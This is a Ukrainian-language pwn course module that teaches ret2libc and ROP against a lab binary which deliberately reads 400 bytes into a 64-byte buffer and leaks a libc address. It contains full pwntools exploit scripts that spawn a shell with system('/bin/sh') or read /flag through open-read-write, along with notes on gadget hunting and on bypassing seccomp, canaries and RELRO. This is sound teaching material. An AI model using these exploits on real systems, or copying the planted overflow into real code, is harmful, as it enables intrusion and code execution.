# Stage 08: ret2libc - Повноцінна експлуатація з ROP

## 🎯 Мета завдання

Опанувати **повноцінну експлуатацію** сучасних програм: поєднати витік адрес, обхід ASLR, buffer overflow та ROP (Return-Oriented Programming) для виклику системних функцій. Це вершина навчального курсу!

## 📚 Що ви дізнаєтесь

- Що таке ROP (Return-Oriented Programming)
- Як будувати ROP chain для виклику функцій
- Техніку ret2libc з NX увімкненим
- Open-Read-Write (ORW) як альтернативу shell
- Чому ORW надійніше за `system("/bin/sh")`
- Як поєднувати leak + BOF + ROP в один exploit
- Робота з gadget'ами та їх пошук

## 🔧 Необхідні інструменти

```bash
# Python та pwntools
pip3 install pwntools

# ROPgadget для пошуку gadget'ів
pip3 install ROPgadget

# one_gadget (опціонально)
gem install one_gadget
```

## 📖 Теоретична основа

### Що таке ret2libc?

**ret2libc (return-to-libc)** - техніка експлуатації коли **NX увімкнено** і ми не можемо виконати shellcode у стеку. Замість цього ми викликаємо функції з libc.

**Проблема з NX:**
```c
// Stage 06: NX=OFF, можна shellcode
char shellcode[] = "\x48\x31\xc0...";  // execve("/bin/sh")
payload = shellcode + padding + p64(адреса_shellcode)
✅ Працює бо стек виконуваний

// Stage 08: NX=ON, shellcode НЕ працює
payload = shellcode + padding + p64(адреса_shellcode)
❌ Segmentation fault - стек НЕ виконуваний!
```

**Рішення - ret2libc:**
```python
# Замість shellcode викликаємо system("/bin/sh") з libc
payload = padding + rop_chain
# rop_chain = адреси функцій + параметри
✅ Працює бо виконуємо код з libc (він виконуваний)
```

### Що таке ROP?

**ROP (Return-Oriented Programming)** - програмування через послідовність `ret` інструкцій.

**Ідея:** Ланцюжок `ret` "стрибає" по невеликих шматках коду (gadget'ах), кожен з яких робить щось корисне.

```
Нормальна програма:
main() → func1() → func2() → return

ROP chain (ми контролюємо стек):
gadget1 (pop rdi; ret) → gadget2 (pop rsi; ret) → gadget3 (system)
```

### Анатомія ROP chain

**Що таке gadget?**

Gadget - коротка послідовність інструкцій що закінчується `ret`:

```asm
; Gadget 1: pop rdi; ret
0x00401234:  pop  rdi     ; Бере значення зі стеку → rdi
0x00401235:  ret          ; Повертається (стрибає далі)

; Gadget 2: pop rsi; ret
0x00401678:  pop  rsi     ; Бере значення зі стеку → rsi
0x00401679:  ret

; Gadget 3: system
0x7ffff7a50d70: <system>  ; Виклик system()
```

**Як це працює:**

```
СТЕК (наш payload):
┌─────────────────────┐
│ padding (72 байти)  │  Заповнення до saved RIP
├─────────────────────┤
│ 0x00401234          │  ← saved RIP: адреса "pop rdi; ret"
├─────────────────────┤
│ адреса "/bin/sh"    │  ← Аргумент для rdi (параметр system)
├─────────────────────┤
│ 0x7ffff7a50d70      │  ← Адреса system()
└─────────────────────┘

ВИКОНАННЯ:
1. return → стрибок на 0x00401234
2. pop rdi     → rdi = адреса "/bin/sh"
3. ret         → стрибок на 0x7ffff7a50d70
4. system()    → system("/bin/sh") виконується!
```

## 💻 Аналіз коду сервера

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

void menu(void){
    puts("stage08: type LEAK to get libc address, or PAYLOAD for BOF:");
    fflush(stdout);
}

void leak(void){
    // Витік адреси puts з libc
    void* p = dlsym(RTLD_NEXT, "puts");
    dprintf(1, "PUTS=%p\n", p);
}

void bof(void){
    char buf[64];
    puts("send payload:");
    ssize_t n = read(0, buf, 400);  // ❌ BOF: 400 байт в buf[64]
    dprintf(1, "got %zd bytes\n", n);
}

int main(void){
    setbuf(stdout, NULL);
    menu();

    // Читаємо команду
    char in[16]={0};
    if(read(0, in, sizeof(in)-1)<=0) return 0;

    if(!strncmp(in,"LEAK",4)){
        leak();        // Спочатку leak
        bof();         // Потім BOF
    } else if(!strncmp(in,"PAYL",4)){
        bof();         // Або одразу BOF
    } else {
        puts("unknown");
    }

    return 0;
}
```

### Покрокова логіка

**Етап 1: LEAK**
```
Client: "LEAK\n"
Server: "PUTS=0x7ffff7a809c0\n"
```

**Етап 2: BOF**
```
Server: "send payload:\n"
Client: [padding 72] + [ROP chain]
Server: "got 400 bytes\n"
→ Return виконує ROP chain
```

## 🎥 Покадрове виконання ROP chain (ДЕТАЛЬНО!)

Це **НАЙВАЖЛИВІША** частина - покрокове розуміння як працює ROP.

### Наш payload:
```python
payload = b'A'*72 + p64(pop_rdi) + p64(binsh) + p64(system)
#         └──┬──┘   └────┬─────┘   └───┬───┘   └────┬────┘
#          padding   gadget#1      arg        function
```

### Розгляне мо ЩО ВІДБУВАЄТЬСЯ на КОЖНОМУ такті процесора:

```
╔═══════════════════════════════════════════════════════════════╗
║ КАДР 0: Після return з bof() - ПОЧАТОК ROP CHAIN             ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║ Стек (після BOF):                                             ║
║         ▼ RSP (stack pointer)                                 ║
║ ┌─────────────────────────────┐ 0x7ffe...f80                  ║
║ │ 0x00401234                  │ ← Адреса gadget "pop rdi; ret"║
║ ├─────────────────────────────┤ 0x7ffe...f88                  ║
║ │ 0x7ffff7b98e1a              │ ← Адреса "/bin/sh"            ║
║ ├─────────────────────────────┤ 0x7ffe...f90                  ║
║ │ 0x7ffff7a50d70              │ ← Адреса system()             ║
║ └─────────────────────────────┘                               ║
║                                                               ║
║ Регістри CPU:                                                 ║
║   RIP = 0x00401180 (адреса return в bof)                      ║
║   RSP = 0x7ffe...f80                                          ║
║   RDI = ???????? (випадкове значення)                         ║
║                                                               ║
║ Що виконується:                                               ║
║   return інструкція в bof()                                   ║
╚═══════════════════════════════════════════════════════════════╝
                        ▼
╔═══════════════════════════════════════════════════════════════╗
║ КАДР 1: return виконується - СТРИБОК на gadget               ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║ Інструкція:                                                   ║
║   ret  ; = pop rip; jmp rip                                   ║
║                                                               ║
║ Крок 1.1: pop rip                                             ║
║   RIP = [RSP]        ; RIP = 0x00401234 (адреса gadget)       ║
║   RSP += 8           ; RSP тепер 0x7ffe...f88                 ║
║                                                               ║
║ Крок 1.2: jmp rip                                             ║
║   Процесор стрибає на 0x00401234                              ║
║                                                               ║
║ Стек ПІСЛЯ ret:                                               ║
║                 ▼ RSP                                         ║
║ ┌─────────────────────────────┐                               ║
║ │ 0x7ffff7b98e1a              │ 0x7ffe...f88                  ║
║ ├─────────────────────────────┤                               ║
║ │ 0x7ffff7a50d70              │ 0x7ffe...f90                  ║
║ └─────────────────────────────┘                               ║
║                                                               ║
║ Регістри:                                                     ║
║   RIP = 0x00401234 (вказує на "pop rdi")                      ║
║   RSP = 0x7ffe...f88                                          ║
║   RDI = ???????? (ще не змінено)                              ║
╚═══════════════════════════════════════════════════════════════╝
                        ▼
╔═══════════════════════════════════════════════════════════════╗
║ КАДР 2: Виконується gadget "pop rdi"                         ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║ Код за адресою 0x00401234:                                    ║
║   0x00401234:  pop  rdi    ; Витягти значення зі стеку → RDI ║
║   0x00401235:  ret         ; Повернутися (стрибок далі)      ║
║                                                               ║
║ Крок 2.1: pop rdi                                             ║
║   RDI = [RSP]        ; RDI = 0x7ffff7b98e1a (адреса "/bin/sh")║
║   RSP += 8           ; RSP тепер 0x7ffe...f90                 ║
║                                                               ║
║ Стек ПІСЛЯ pop rdi:                                           ║
║                         ▼ RSP                                 ║
║ ┌─────────────────────────────┐                               ║
║ │ 0x7ffff7a50d70              │ 0x7ffe...f90                  ║
║ └─────────────────────────────┘                               ║
║                                                               ║
║ Регістри:                                                     ║
║   RIP = 0x00401235 (вказує на "ret")                          ║
║   RSP = 0x7ffe...f90                                          ║
║   RDI = 0x7ffff7b98e1a ✓  ← ПАРАМЕТР ГОТОВИЙ!                ║
║                                                               ║
║ Пояснення:                                                    ║
║   RDI тепер містить адресу "/bin/sh" - перший параметр для   ║
║   майбутнього виклику system()                                ║
╚═══════════════════════════════════════════════════════════════╝
                        ▼
╔═══════════════════════════════════════════════════════════════╗
║ КАДР 3: Виконується "ret" в gadget - СТРИБОК на system       ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║ Інструкція:                                                   ║
║   0x00401235:  ret  ; = pop rip; jmp rip                      ║
║                                                               ║
║ Крок 3.1: pop rip                                             ║
║   RIP = [RSP]        ; RIP = 0x7ffff7a50d70 (адреса system)   ║
║   RSP += 8           ; RSP тепер 0x7ffe...f98                 ║
║                                                               ║
║ Крок 3.2: jmp rip                                             ║
║   Процесор стрибає на 0x7ffff7a50d70 (початок system())       ║
║                                                               ║
║ Стек ПІСЛЯ ret:                                               ║
║                                 ▼ RSP                         ║
║ ┌─────────────────────────────┐                               ║
║ │ (щось нижче)                │ 0x7ffe...f98                  ║
║ └─────────────────────────────┘                               ║
║                                                               ║
║ Регістри:                                                     ║
║   RIP = 0x7ffff7a50d70 (початок system())                     ║
║   RSP = 0x7ffe...f98                                          ║
║   RDI = 0x7ffff7b98e1a (адреса "/bin/sh") ✓                   ║
║                                                               ║
║ CPU входить в функцію system з параметром "/bin/sh"!          ║
╚═══════════════════════════════════════════════════════════════╝
                        ▼
╔═══════════════════════════════════════════════════════════════╗
║ КАДР 4: system("/bin/sh") виконується - SUCCESS!             ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║ Функція system:                                               ║
║   int system(const char *command)                             ║
║   {                                                           ║
║       // RDI містить command = "/bin/sh"                      ║
║       execve("/bin/sh", ...)  // Запускає shell              ║
║   }                                                           ║
║                                                               ║
║ Результат:                                                    ║
║   ✓ Shell запущений!                                          ║
║   ✓ Ми отримали інтерактивну командну оболонку!              ║
║   ✓ Можемо виконувати команди: ls, cat flag.txt, etc.        ║
╚═══════════════════════════════════════════════════════════════╝
```

## 🎯 Calling Convention x86-64 - ЧОМУ саме RDI?

Це стандарт **System V AMD64 ABI** (Application Binary Interface) для Unix систем.

### Таблиця передачі параметрів:

```
┌─────────┬───────────┬──────────────────────────────────────┐
│ Параметр│ Регістр   │ Приклад використання                 │
├─────────┼───────────┼──────────────────────────────────────┤
│ 1-й     │ RDI       │ system("/bin/sh")                    │
│         │           │        ▲ в RDI                        │
├─────────┼───────────┼──────────────────────────────────────┤
│ 2-й     │ RSI       │ open("/flag", O_RDONLY)              │
│         │           │      ▲        ▲                       │
│         │           │     RDI      RSI                      │
├─────────┼───────────┼──────────────────────────────────────┤
│ 3-й     │ RDX       │ read(3, buf, 100)                    │
│         │           │      ▲  ▲    ▲                        │
│         │           │     RDI RSI RDX                       │
├─────────┼───────────┼──────────────────────────────────────┤
│ 4-й     │ RCX       │ (рідко використовується в syscall)   │
├─────────┼───────────┼──────────────────────────────────────┤
│ 5-й     │ R8        │ (рідко)                              │
├─────────┼───────────┼──────────────────────────────────────┤
│ 6-й     │ R9        │ (рідко)                              │
├─────────┼───────────┼──────────────────────────────────────┤
│ 7+      │ Stack     │ Якщо > 6 параметрів → в стек         │
└─────────┴───────────┴──────────────────────────────────────┘
```

### Детальні приклади:

**Приклад 1: system("/bin/sh")**
```c
system("/bin/sh");
```

**В асемблері:**
```asm
lea    rdi, [rel binsh_string]   ; RDI = адреса "/bin/sh"
call   system                     ; Виклик system()
```

**Наш ROP еквівалент:**
```python
pop_rdi_ret = 0x00401234  # Адреса gadget "pop rdi; ret"
binsh = 0x7ffff7b98e1a    # Адреса "/bin/sh"
system = 0x7ffff7a50d70   # Адреса system()

payload = b'A'*72 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
```

**Приклад 2: open("/flag", O_RDONLY)**
```c
int fd = open("/flag", O_RDONLY);  // O_RDONLY = 0
```

**В асемблері:**
```asm
lea    rdi, [rel flag_string]     ; RDI = "/flag"
xor    rsi, rsi                    ; RSI = 0 (O_RDONLY)
call   open
```

**ROP еквівалент:**
```python
pop_rdi_ret = ...
pop_rsi_ret = ...
flag_str = ...
open_addr = ...

rop_chain = (
    p64(pop_rdi_ret) +
    p64(flag_str) +          # RDI = "/flag"
    p64(pop_rsi_ret) +
    p64(0) +                 # RSI = 0
    p64(open_addr)
)
```

**Приклад 3: read(3, buf, 100)**
```c
read(3, buf, 100);
```

**В асемблері:**
```asm
mov    rdi, 3                      ; RDI = 3 (file descriptor)
lea    rsi, [rbp-0x100]            ; RSI = адреса buf
mov    rdx, 100                    ; RDX = 100 (розмір)
call   read
```

**ROP еквівалент потребує 3 gadget'и:**
```python
pop_rdi_ret = ...
pop_rsi_ret = ...
pop_rdx_ret = ...
buf_addr = ...
read_addr = ...

rop_chain = (
    p64(pop_rdi_ret) +
    p64(3) +                 # RDI = fd
    p64(pop_rsi_ret) +
    p64(buf_addr) +          # RSI = buffer
    p64(pop_rdx_ret) +
    p64(100) +               # RDX = size
    p64(read_addr)
)
```

## 🔢 File Descriptors - чому fd=3?

**КОЖЕН процес** в Linux має таблицю відкритих файлів (file descriptor table):

```
┌──────┬────────────────────────────────────────────────┐
│  FD  │ Призначення                                    │
├──────┼────────────────────────────────────────────────┤
│  0   │ stdin  (standard input - клавіатура/pipe)      │
│      │ read(0, buf, N)  → читає зі stdin              │
├──────┼────────────────────────────────────────────────┤
│  1   │ stdout (standard output - екран/файл)          │
│      │ write(1, buf, N) → пише в stdout               │
├──────┼────────────────────────────────────────────────┤
│  2   │ stderr (standard error - помилки, теж екран)   │
│      │ write(2, buf, N) → пише помилки                │
├──────┼────────────────────────────────────────────────┤
│  3   │ (вільно) ← Перший файл що МИ відкриємо         │
├──────┼────────────────────────────────────────────────┤
│  4   │ (вільно) ← Другий файл                         │
├──────┼────────────────────────────────────────────────┤
│  5   │ (вільно) ← Третій файл                         │
├──────┼────────────────────────────────────────────────┤
│ ...  │ ...                                            │
└──────┴────────────────────────────────────────────────┘
```

### Приклад виконання ORW:

**Крок 1: open("/flag", O_RDONLY)**
```c
int fd = open("/flag", O_RDONLY);
// Повертає 3 (перший вільний FD)
```

**Стан після open:**
```
┌──────┬────────────────────────────────────┐
│  0   │ stdin                              │
│  1   │ stdout                             │
│  2   │ stderr                             │
│  3   │ /flag (наш файл!) ← ОСЬ ТУТ       │
└──────┴────────────────────────────────────┘
```

**Крок 2: read(3, buf, 100)**
```c
read(3, buf, 100);
// Читає З ФАЙЛУ /flag (бо fd=3 вказує на нього)
```

**Крок 3: write(1, buf, 100)**
```c
write(1, buf, 100);
// Пише на ЕКРАН (бо fd=1 = stdout)
```

### Що якщо в програмі вже відкриті файли?

**Приклад:**
```c
// Програма вже відкрила логи:
int log_fd = open("/var/log/app.log", O_WRONLY);  // fd = 3
int db_fd = open("/var/db/data.db", O_RDONLY);    // fd = 4

// Тепер МИ відкриваємо:
int flag_fd = open("/flag", O_RDONLY);             // fd = 5!
```

**Тоді в ROP треба:**
```python
rop.read(5, buf, 100)  # Не 3, а 5!
```

**Як дізнатись який FD буде?**
1. **Дебаг в GDB** - подивитись `/proc/PID/fd`
2. **Brute-force** - спробувати fd=3,4,5,6...
3. **Аналіз коду** - подивитись чи програма відкриває файли

## 🚀 Покрокове рішення

### Крок 1: Збудуйте бінарник

```bash
cd stage08_ret2libc
./build.sh
```

Перевірте захисти:
```bash
checksec --file=../build/stage08_ret2libc
```

Очікується:
```
RELRO:        Partial RELRO
Stack:        No canary found
NX:           NX enabled     ← Важливо!
PIE:          No PIE
```

### Крок 2: Підготовка - витяг libc

**Знайдіть яка libc:**
```bash
ldd ../build/stage08_ret2libc | grep libc
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

**Скопіюйте для exploit:**
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
cp /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./ld.so.2
```

### Крок 3: Знайдіть ROP gadget'и

**Варіант A: Автоматично через pwntools:**
```python
from pwn import *
libc = ELF('./libc.so.6')
rop = ROP(libc)
print(rop.find_gadget(['pop rdi', 'ret']))
```

**Варіант B: ROPgadget:**
```bash
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep "pop rdi"
```

### Крок 4: Створіть exploit (система shell)

Файл `exploit_system.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Налаштування
context.arch = 'amd64'
context.log_level = 'info'

# Завантажуємо файли
elf = ELF('../build/stage08_ret2libc', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# Параметри
OFFSET = 72

def exploit():
    # Запускаємо процес
    io = process('../build/stage08_ret2libc')

    # === ЕТАП 1: LEAK ===
    io.recvuntil(b'BOF:')
    io.sendline(b'LEAK')

    # Отримуємо leak
    io.recvline()
    leaked_puts = int(io.recvline().split(b'=')[1], 16)
    log.success(f"Leaked puts: {hex(leaked_puts)}")

    # Розраховуємо libc base
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    # === ЕТАП 2: ROP CHAIN ===
    io.recvuntil(b'payload:')

    # Знаходимо що потрібно
    system_addr = libc.symbols['system']
    binsh_addr = next(libc.search(b'/bin/sh\x00'))
    log.info(f"system: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # Будуємо ROP chain
    rop = ROP(libc)
    rop.call(system_addr, [binsh_addr])

    # Payload
    payload = b'A' * OFFSET + rop.chain()
    log.info(f"Payload length: {len(payload)}")

    # Відправляємо
    io.sendline(payload)

    # Shell!
    io.interactive()

if __name__ == '__main__':
    exploit()
```

### Крок 5: Створіть ORW exploit (надійніший)

**Чому ORW?**
- `system("/bin/sh")` може не працювати через:
  - Seccomp фільтри (блокують `execve`)
  - Мережеві обмеження
  - Відсутність TTY

- **ORW (Open-Read-Write)** завжди працює:
  1. `open("/flag", O_RDONLY)`
  2. `read(fd, buffer, size)`
  3. `write(1, buffer, size)`

Файл `exploit_orw.py`:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('../build/stage08_ret2libc', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET = 72

def exploit_orw():
    io = process('../build/stage08_ret2libc')

    # === LEAK ===
    io.recvuntil(b'BOF:')
    io.sendline(b'LEAK')
    io.recvline()
    leaked_puts = int(io.recvline().split(b'=')[1], 16)
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    # === ПІДГОТОВКА ===
    io.recvuntil(b'payload:')

    # Адреси функцій
    open_addr = libc.symbols['open']
    read_addr = libc.symbols['read']
    write_addr = libc.symbols['write']

    # Місце для даних (використаємо .bss)
    bss_addr = elf.bss(0x200)  # .bss + offset

    log.info(f"open:  {hex(open_addr)}")
    log.info(f"read:  {hex(read_addr)}")
    log.info(f"write: {hex(write_addr)}")
    log.info(f"bss:   {hex(bss_addr)}")

    # === ROP CHAIN ===
    rop = ROP(libc)

    # 1. open("/flag", O_RDONLY) → повертає fd в rax
    flag_str = b'/flag\x00'
    flag_addr = bss_addr
    # Спочатку запишемо "/flag" в .bss (через read або інший спосіб)
    # Для простоти покладемо в payload і скопіюємо

    # Альтернатива: якщо "/flag" є в libc
    try:
        flag_addr = next(libc.search(b'/flag\x00'))
    except:
        # Якщо немає, треба записати самим
        log.warning("'/flag' not in libc, using .bss")
        flag_addr = bss_addr

    rop.open(flag_addr, 0)  # open(path, O_RDONLY)

    # 2. read(3, bss+0x100, 0x100) → читаємо файл
    # fd буде 3 (стандартно: 0=stdin, 1=stdout, 2=stderr, 3=перший файл)
    rop.read(3, bss_addr + 0x100, 0x100)

    # 3. write(1, bss+0x100, 0x100) → виводимо на екран
    rop.write(1, bss_addr + 0x100, 0x100)

    # Payload
    payload = b'A' * OFFSET + rop.chain()

    # Якщо "/flag" треба додати
    if flag_addr == bss_addr:
        payload += flag_str

    log.info(f"ROP chain length: {len(rop.chain())}")
    io.sendline(payload)

    # Отримуємо вміст /flag
    io.recvline()  # "got N bytes"
    result = io.recvall(timeout=2)
    log.success(f"Result:\n{result.decode(errors='ignore')}")

    io.close()

if __name__ == '__main__':
    exploit_orw()
```

### Крок 6: Запустіть exploit

**Підготовка:**
```bash
# Створіть тестовий файл /flag
echo "FLAG{STAGE8_RET2LIBC_ORW}" | sudo tee /flag
sudo chmod 444 /flag
```

**Запуск:**
```bash
chmod +x exploit_orw.py
python3 exploit_orw.py
```

## 🔍 Детальний розбір ROP

### Візуалізація виконання

**1. Початковий стек (після BOF):**
```
┌────────────────────┐  ← RSP (після return з bof)
│ pop rdi; ret       │  Gadget #1
├────────────────────┤
│ адреса "/flag"     │  Параметр для rdi (arg1)
├────────────────────┤
│ pop rsi; ret       │  Gadget #2
├────────────────────┤
│ 0 (O_RDONLY)       │  Параметр для rsi (arg2)
├────────────────────┤
│ pop rdx; ret       │  Gadget #3 (якщо треба 3-й параметр)
├────────────────────┤
│ адреса open()      │  Виклик open()
├────────────────────┤
│ ... наступні calls │
└────────────────────┘
```

**2. Виконання Gadget #1:**
```asm
pop rdi          ; rdi = адреса "/flag"
ret              ; RSP += 8, стрибок на наступну адресу
```

**3. Виконання Gadget #2:**
```asm
pop rsi          ; rsi = 0 (O_RDONLY)
ret              ; Стрибок на open()
```

**4. Виклик open():**
```
open(rdi="/flag", rsi=0, rdx=?) → повертає fd=3
```

**5. Аналогічно для read() та write()**

### Calling convention x86-64

На x86-64 параметри передаються через регістри:

```
1-й параметр: RDI
2-й параметр: RSI
3-й параметр: RDX
4-й параметр: RCX
5-й параметр: R8
6-й параметр: R9
7+ параметри: Через стек
```

**Приклади:**
```c
open("/flag", O_RDONLY)
→ rdi = "/flag"
→ rsi = 0

read(3, buf, 100)
→ rdi = 3
→ rsi = buf
→ rdx = 100

write(1, buf, 100)
→ rdi = 1
→ rsi = buf
→ rdx = 100
```

### Пошук gadget'ів

**Через ROPgadget:**
```bash
ROPgadget --binary ./libc.so.6 > gadgets.txt

# Шукаємо конкретні:
grep "pop rdi" gadgets.txt
grep "pop rsi" gadgets.txt
grep "pop rdx" gadgets.txt
```

**Через pwntools:**
```python
rop = ROP(libc)
print(rop.find_gadget(['pop rdi', 'ret']))
print(rop.find_gadget(['pop rsi', 'pop r15', 'ret']))  # Часто разом
print(rop.find_gadget(['pop rdx', 'ret']))
```

**Корисні gadget'и:**
```asm
pop rdi; ret              # Найпоширеніший
pop rsi; pop r15; ret     # rsi часто з r15
pop rdx; pop rbx; ret     # rdx часто з rbx
pop rax; ret              # Для syscall number
syscall; ret              # Прямий системний виклик
```

## 🎓 Практичні завдання

### Завдання 1: One gadget (якщо пощастить)

```bash
one_gadget ./libc.so.6
```

One gadget - адреса в libc що одразу викликає shell, якщо виконані певні умови:

```python
# Якщо є one_gadget
one_gadget_addr = libc.address + 0x...  # З виводу one_gadget
payload = b'A' * 72 + p64(one_gadget_addr)
# Може спрацювати якщо умови виконані!
```

### Завдання 2: ret2csu (Universal gadget)

У кожному бінарнику є `__libc_csu_init` з корисними gadget'ами:

```python
csu_pop = 0x...  # адреса в __libc_csu_init
# Дозволяє встановити rbx, rbp, r12, r13, r14, r15
# Корисно коли немає простих pop gadget'ів
```

### Завдання 3: SROP (Sigreturn ROP)

Просунута техніка через `sigreturn`:

```python
# Контролює ВСІ регістри одразу
frame = SigreturnFrame()
frame.rdi = arg1
frame.rsi = arg2
frame.rdx = arg3
frame.rip = syscall_addr
```

### Завдання 4: Stack pivot

Якщо буфер малий, перенесіть стек в іншу область:

```python
# Gadget: xchg rax, rsp; ret або mov rsp, rax; ret
# Дозволяє працювати з більшим простором
```

## 💡 Порівняння технік

| Техніка | NX | Коли використовувати | Складність |
|---------|----|--------------------|------------|
| Shellcode | OFF | Стек виконуваний | ⭐⭐☆☆☆ |
| ret2win | OFF/ON | Є функція win() | ⭐⭐☆☆☆ |
| ret2libc | ON | Є leak libc | ⭐⭐⭐⭐☆ |
| ORW | ON | Seccomp блокує execve | ⭐⭐⭐⭐☆ |
| ret2dlresolve | ON | Немає leak | ⭐⭐⭐⭐⭐ |
| SROP | ON | Обмежені gadget'и | ⭐⭐⭐⭐⭐ |

## 🔐 Захисти та обходи

### Seccomp

**Що це:** Фільтр системних викликів

```c
// Дозволити тільки open/read/write/exit
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
// execve заблоковано!
```

**Обхід:** Використати ORW замість shell

### Stack cookies (Canary)

**Обхід:**
1. Leak canary через format string
2. Включити canary в payload
3. Або знайти інший баг (не BOF)

### Full RELRO

**Обхід:** Не можна перезаписати GOT, використати чистий ROP

### CFI (Control Flow Integrity)

**Що це:** Перевірка що виклики йдуть куди треба

**Обхід:** Складний, потрібні zero-day техніки

## 📚 Важливі поняття

### 1. Syscall vs libc function

**Libc function** (наш вибір):
```c
open("/flag", O_RDONLY);  // Викликає обгортку з libc
```

**Прямий syscall:**
```asm
mov rax, 2        ; syscall number для open
mov rdi, path
mov rsi, 0
syscall
```

### 2. Alignment

x86-64 вимагає щоб `call` був вирівняний на 16 байт:

```python
# Іноді треба додати ret gadget для вирівнювання
rop.raw(rop.find_gadget(['ret']))  # Просто ret
rop.system(binsh_addr)
```

### 3. Libc versioning

```bash
# Перевірте версію
strings ./libc.so.6 | grep "GNU C Library"

# Завантажте правильну libc
# https://libc.blukat.me/  - база libc версій
# https://libc.rip/        - альтернатива
```

## ✅ Чеклист виконання

- [ ] Зібрано бінарник через `build.sh`
- [ ] Перевірено що NX=ON, ASLR=ON
- [ ] Витягнуто libc що використовує програма
- [ ] Створено exploit з leak
- [ ] Створено ROP chain для system("/bin/sh")
- [ ] Або створено ORW exploit
- [ ] Створено /flag з тестовим прапором
- [ ] Успішно отримано shell або прочитано /flag
- [ ] Розумію як працює ROP
- [ ] Знаю calling convention x86-64
- [ ] Можу знайти gadget'и
- [ ] Завершив весь курс! 🎉

---

**Час виконання:** 45-60 хвилин
**Складність:** ⭐⭐⭐⭐⭐ (Висока)
**Категорія:** PWN / ROP / ret2libc
**Ключові поняття:** ROP, ret2libc, ORW, gadgets, calling convention

## 🎉 Вітаємо з завершенням курсу!

Ви пройшли шлях від базового `nc` до повноцінного ret2libc з ROP!

### Що ви вмієте тепер:

1. ✅ **TCP взаємодія** (nc, pwntools)
2. ✅ **Аналіз захистів** (checksec, розуміння Canary/NX/PIE/RELRO)
3. ✅ **Buffer Overflow** (справжній BOF)
4. ✅ **Витік адрес** (leak, обхід ASLR)
5. ✅ **ROP** (побудова ROP chain)
6. ✅ **ret2libc** (виклик функцій з libc)
7. ✅ **ORW** (Open-Read-Write як альтернатива shell)

### Наступні кроки:

**Практика:**
- [pwn.college](https://pwn.college/) - автоматизоване навчання
- [ROP Emporium](https://ropemporium.com/) - задачі по ROP
- [Nightmare](https://guyinatuxedo.github.io/) - великий курс
- [pwnable.kr](http://pwnable.kr/) - корейські PWN задачі
- [pwnable.tw](https://pwnable.tw/) - тайванські PWN задачі

**CTF змагання:**
- [CTFtime.org](https://ctftime.org/) - календар CTF
- picoCTF, HackTheBox, TryHackMe

**Просунуті теми:**
- Heap exploitation (use-after-free, double-free)
- Kernel exploitation
- Browser exploitation
- ARM/MIPS exploitation
- Windows exploitation

**Удачі в PWN! 🚀**
